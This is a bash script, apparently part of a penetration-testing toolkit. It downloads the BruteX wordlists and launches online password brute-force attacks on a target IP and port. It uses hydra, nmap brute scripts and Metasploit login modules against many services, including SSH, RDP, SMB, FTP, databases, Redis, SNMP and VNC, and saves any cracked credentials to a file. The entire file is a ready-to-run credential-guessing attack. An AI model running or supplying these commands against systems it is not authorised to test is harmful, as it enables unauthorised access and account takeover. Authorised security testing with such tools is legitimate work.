#!/bin/bash
# Gather Password Information with Brute Force
#Â https://book.hacktricks.xyz/brute-force

####################
# Global variables #
####################

DEPENDENCIES="git gzip nmap hydra"

myPWFILE="output/password-findings-port-$PORT.txt"

################################
# Installation of Dependencies #
################################

fuGET_DEPS

###########################
# Create output directory #
###########################

if [ ! -d "output/" ]; then
  fuINFO "creating \"output/\" directory"
  mkdir output && echo "[ OK ]"
fi

#######################
# Prepare Brute Force #
#######################

fuINFO "Prepare word- and password lists"
git clone https://github.com/1N3/BruteX.git /usr/share/brutex/ 2>/dev/null
gzip -d /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
#PWLIST="/usr/share/wordlists/rockyou.txt"
USERLIST="/usr/share/brutex/wordlists/simple-users.txt"
PWLIST="/usr/share/brutex/wordlists/password.lst"

###############################
# Brute Force Common Services #
###############################

# AFP
if [ "$IP" != "" ] && [ "$PORT" == "548" ]; then
  fuTITLE "Nmap brute force with script afp-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script afp-brute -oN $myPWFILE
fi

# AJP
if [ "$IP" != "" ] && [ "$PORT" == "8009" ]; then
  fuTITLE "Nmap brute force with script ajp-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script ajp-brute -oN $myPWFILE
fi

# Cassandra
if [ "$IP" != "" ] && [ "$PORT" == "9160" ]; then
  fuTITLE "Nmap brute force with script cassandra-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script cassandra-brute -oN $myPWFILE
fi

# CouchDB
if [ "$IP" != "" ] && [ "$PORT" == "5984" ] && [ "$USERNAME" != "" ]; then
  # hydra
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP -s $PORT http-get /
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/couchdb/couchdb_login; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "5984" ] && [ "$USERNAME" == "" ]; then
  # hydra
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP -s $PORT http-get /
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/couchdb/couchdb_login; set rhost $IP; exploit; exit;" -q -o $myPWFILE
fi

# FTP
if [ "$IP" != "" ] && [ "$PORT" == "21" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P /usr/share/brutex/wordlists/ftp_defpass.lst $IP ftp -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "21" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP, port $PORT and default ftp usernames"
  hydra -C /usr/share/brutex/wordlists/ftp-default-userpass.txt $IP ftp -o $myPWFILE
  hydra -L /usr/share/brutex/wordlists/ftp_defuser.lst -P /usr/share/brutex/wordlists/ftp_defpass.lst $IP ftp -o $myPWFILE
fi

# IMAP
if [ "$IP" != "" ] && [ "$PORT" == "993" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP imap -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "993" ] && [ "$USERNAME" == "" ]; then
  # hydra
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP imap -o $myPWFILE
  # nmap
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script imap-brute -oN $myPWFILE
fi

# LDAP
if [ "$IP" != "" ] && [ "$PORT" == "389" ]; then
  fuTITLE "Nmap brute force with script ldap-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script ldap-brute -oN $myPWFILE
fi

# Mongo
if [ "$IP" != "" ] && [ "$PORT" == "27017" ] && [ "$USERNAME" != "" ]; then
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/mongodb/mongodb_login; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "27017" ] && [ "$USERNAME" == "" ]; then
  # nmap
  fuTITLE "Nmap brute force with script mongodb-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script mongodb-brute -n -oN $myPWFILE
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/mongodb/mongodb_login; set rhost $IP; exploit; exit;" -q -o $myPWFILE
fi

# MySQL
if [ "$IP" != "" ] && [ "$PORT" == "3306" ] && [ "$USERNAME" != "" ]; then
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set VERBOSE false; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "3306" ] && [ "$USERNAME" == "" ]; then
  # hydra
  fuTITLE "Hydra brute force username/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP mysql -o $myPWFILE
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set VERBOSE false; set rhost $IP; exploit; exit;" -q -o $myPWFILE
fi

# OracleSQL
if [ "$IP" != "" ] && [ "$PORT" == "1521" ]; then
  fuTITLE "Nmap brute force with script oracle-brute on $IP and port $PORT"
  nmap $IP -p $PORT --script oracle-brute -oN $myPWFILE
  #nmap $IP -p $PORT --script oracle-brute --script-args oracle-brute.sid=$SID -oN $myPWFILE
fi

# POP
if [ "$IP" != "" ] && [ "$PORT" == "995" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP pop3 -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "995" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP pop3 -o $myPWFILE
fi

# PostgreSQL
if [ "$IP" != "" ] && [ "$PORT" == "5432" ] && [ "$USERNAME" != "" ]; then
  # hydra
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP postgres -o $myPWFILE
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP, port $PORT and username $USERNAME"
  msfconsole -x "use auxiliary/scanner/postgres/postgres_login; set rhost $IP; set username $USERNAME; exploit; exit;" -q -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "5432" ] && [ "$USERNAME" == "" ]; then
  # hydra
  fuTITLE "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP postgres -o $myPWFILE
  # msfconsole
  fuTITLE "Brute force with msfconsole on $IP and port $PORT"
  msfconsole -x "use auxiliary/scanner/postgres/postgres_login; set rhost $IP; exploit; exit;" -q -o $myPWFILE
  # nmap
  fuTITLE "Nmap brute force with script pqsql-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script pgsql-brute --script-args userdb=$USERLIST,passdb=$PWLIST -oN $myPWFILE
fi

# RDP
if [ "$IP" != "" ] && [ "$PORT" == "3389" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST rdp://$IP -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "3389" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST rdp://$IP -o $myPWFILE
fi

# Redis
if [ "$IP" != "" ] && [ "$PORT" == "6379" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST redis://$IP:$PORT -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "6379" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -P $PWLIST redis://$IP:$PORT -o $myPWFILE
fi

# Rlogin
if [ "$IP" != "" ] && [ "$PORT" == "513" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST rlogin://$IP -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "513" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST rlogin://$IP -o $myPWFILE
fi

# Rsh
if [ "$IP" != "" ] && [ "$PORT" == "514" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME rsh://$IP -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "514" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force login/password pairs on $IP and port $PORT"
  hydra -L $USERLIST rsh://$IP -o $myPWFILE
fi

# Rsync
if [ "$IP" != "" ] && [ "$PORT" == "873" ]; then
  fuTITLE "Nmap brute force with script rsync-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script rsync-brute --script-args userdb=$USERLIST,passdb=$PWLIST -oN $myPWFILE
fi

# RTSP
if [ "$IP" != "" ] && [ "$PORT" == "554" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP rtsp -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "554" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and user root"
  hydra -l root -P $PWLIST $IP rtsp -o $myPWFILE
fi

# SNMP
if [ "$IP" != "" ] && ( [ "$PORT" == "161" ] || [ "$PORT" == "162" ] ) && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp -o $myPWFILE

elif [ "$IP" != "" ] && ( [ "$PORT" == "161" ] || [ "$PORT" == "162" ] ) && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force password on $IP and port $PORT"
  hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP snmp -o $myPWFILE
fi

# SMB
if [ "$IP" != "" ] && [ "$PORT" == "445" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP smb -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "445" ] && [ "$USERNAME" == "Administrator" ]; then
  # hydra
  fuTITLE "Hydra brute force password on $IP, port $PORT and username Administrator"
  hydra -l Administrator -P $PWLIST $IP smb -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "445" ] && [ "$USERNAME" == "" ]; then
  # hydra
  fuTITLE "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP smb -o $myPWFILE
  # nmap
  fuTITLE "Nmap brute force with script smb-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script smb-brute -oN $myPWFILE
fi

# SMTP
if [ "$IP" != "" ] &&  [ "$PORT" == "25" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP smtp -o $myPWFILE

elif [ "$IP" != "" ] && ( [ "$PORT" == "465" ] || [ "$PORT" == "587" ] ) && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME with an SSL connect"
  hydra -l $USERNAME -P $PWLIST $IP smtp -S -o $myPWFILE
fi

# SOCKS
if [ "$IP" != "" ] && [ "$PORT" == "1080" ]; then
  fuTITLE "Nmap brute force with script socks-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script socks-brute --script-args userdb=$USERLIST,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -oN $myPWFILE
fi

# MS-SQL Server
if [ "$IP" != "" ] && [ "$PORT" == "1433" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP mssql -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "1433" ] && [ "$USERNAME" == "" ]; then
  # hydra
  fuTITLE "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP mssql -o $myPWFILE
  # nmap
  fuTITLE "Nmap brute force with script ms-sql-brute on $IP and port $PORT"
  nmap $IP -p $PORT -sV --script ms-sql-brute --script-args userdb=$USERLIST,passdb=$PWLIST,ms-sql-brute.brute-windows-accounts -oN $myPWFILE
fi

# SSH
if [ "$IP" != "" ] && [ "$PORT" == "22" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP ssh -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "22" ] && [ "$USERNAME" == "root" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username root"
  hydra -l root -P $PWLIST $IP ssh -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "22" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP ssh -o $myPWFILE
fi

# Telnet
if [ "$IP" != "" ] && [ "$PORT" == "23" ] && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST $IP telnet -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "23" ] && [ "$USERNAME" == "root" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username root"
  hydra -l root -P $PWLIST $IP telnet -o $myPWFILE

elif [ "$IP" != "" ] && [ "$PORT" == "23" ] && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST $IP telnet -o $myPWFILE
fi

# VNC
if [ "$IP" != "" ] && ( [ "$PORT" == "5800" ] || [ "$PORT" == "5801" ] || [ "$PORT" == "5900" ] || [ "$PORT" == "5901" ] ) && [ "$USERNAME" != "" ]; then
  fuTITLE "Hydra brute force password on $IP, port $PORT and username $USERNAME"
  hydra -l $USERNAME -P $PWLIST -s $PORT $IP vnc -o $myPWFILE

elif [ "$IP" != "" ] && ( [ "$PORT" == "5800" ] || [ "$PORT" == "5801" ] || [ "$PORT" == "5900" ] || [ "$PORT" == "5901" ] ) && [ "$USERNAME" == "" ]; then
  fuTITLE "Hydra brute force password on $IP and port $PORT"
  hydra -L $USERLIST -P $PWLIST -s $PORT $IP vnc -o $myPWFILE
fi


#####################
# Summarize results #
#####################

fuTITLE "Findings in following files:"
if [ -s "$myPWFILE" ]; then
  fuRESULT "Passwords found in: $myPWFILE"
else
  #NOPW=true
  fuERROR "No passwords found"
fi
echo